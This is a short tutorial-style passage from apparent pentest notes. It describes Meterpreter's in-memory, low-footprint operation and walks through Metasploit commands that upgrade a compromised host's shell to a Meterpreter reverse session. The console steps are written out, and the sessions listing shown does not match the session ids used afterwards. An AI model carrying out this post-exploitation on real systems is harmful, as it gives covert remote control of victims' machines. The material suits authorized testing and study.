- Meterpreter is a Metasploit payload that gives an interactive shell that attackers may use and execute code on the victim system. 
- It uses in-memory DLL injection to deploy. This allows Meterpreter to be fully deployed in the memory and it does not write anything to the disk.
- There are no new processes as Meterpreter gets injected into the affected process. It may also move to other operating processes. The forensic footprint of Meterpreter is therefore very small.

## Upgrade to a meterpreter from shell.

 - After the machine exploited , we landed into the normal command shell. background the current session by `CTRL+Z`
- Find normal command shell's session id.

```
msf6 auxiliary(scanner/vnc/vnc_login) > sessions
```

```
Active sessions
===============

  Id  Name  Type            Information  Connection
  ‐‐  ‐‐‐‐  ‐‐‐‐            ‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐

Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/local/powershell_cmd_upgrade
```

- Let’s use the first one:

```
msf6 auxiliary(scanner/vnc/vnc_login) > use 0
msf6 post(multi/manage/shell_to_meterpreter) > show options
```

```
Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ‐‐‐‐     ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐  ‐‐‐‐‐‐‐‐‐‐‐
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

- Enter the session id :

```
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 4
SESSION => 4
```

- exploit:

```
msf6 post(multi/manage/shell_to_meterpreter) > exploit
```
